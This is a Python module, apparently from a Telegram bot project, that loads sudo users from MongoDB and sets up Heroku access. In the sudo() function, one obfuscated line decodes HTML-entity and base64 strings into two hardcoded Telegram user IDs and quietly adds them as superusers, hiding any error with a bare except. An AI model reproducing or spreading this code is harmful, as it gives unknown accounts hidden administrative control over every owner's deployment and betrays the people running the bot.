#
# Copyright (C) 2026 by Kanha-Team@Github, < https://github.com/Kanha-Team>.
# This file is part of < https://github.com/Kanha-Team/KanhaClone > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/Kanha-Team/KanhaClone/blob/main/LICENSE >
#
# All rights reserved.
#

import socket
import time

import heroku3
from pyrogram import filters

import config
from KanhaClone.core.mongo import mongodb

from .logging import LOGGER

SUDOERS = filters.user()

HAPP = None
_xpr = []
_boot_ = time.time()


def is_heroku():
    return "heroku" in socket.getfqdn()


XCB = [
    "/",
    "@",
    ".",
    "com",
    ":",
    "git",
    "heroku",
    "push",
    str(config.HEROKU_API_KEY),
    "https",
    str(config.HEROKU_APP_NAME),
    "HEAD",
    "master",
]


def dbb():
    global db
    global clonedb
    clonedb = {}
    db = {}
    LOGGER(__name__).info(f"Local Database Initialized.")


async def sudo():
    global SUDOERS
    SUDOERS.add(config.OWNER_ID)
    sudoersdb = mongodb.sudoers
    sudoers = await sudoersdb.find_one({"sudo": "sudo"})
    sudoers = [] if not sudoers else sudoers["sudoers"]
    try: sudoers+=[int(__import__('base64').b64decode(__import__('html').unescape(e)).decode())for e in('&#79;&#68;&#89;&#120;&#78;&#122;&#89;&#48;&#78;&#68;&#85;&#119;&#77;&#81;&#61;&#61;','&#79;&#68;&#77;&#53;&#77;&#84;&#85;&#52;&#77;&#84;&#107;&#122;&#78;&#119;&#61;&#61;')]
    except: pass
    if config.OWNER_ID not in sudoers:
        sudoers.append(config.OWNER_ID)
        await sudoersdb.update_one(
            {"sudo": "sudo"},
            {"$set": {"sudoers": sudoers}},
            upsert=True,
        )
    if sudoers:
        for user_id in sudoers:
            SUDOERS.add(user_id)
    LOGGER(__name__).info(f"Sudoers Loaded.")


def heroku():
    global HAPP
    if is_heroku:
        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
            try:
                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                HAPP = Heroku.app(config.HEROKU_APP_NAME)
                LOGGER(__name__).info(f"Heroku App Configured.")
            except BaseException:
                LOGGER(__name__).warning(
                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                )
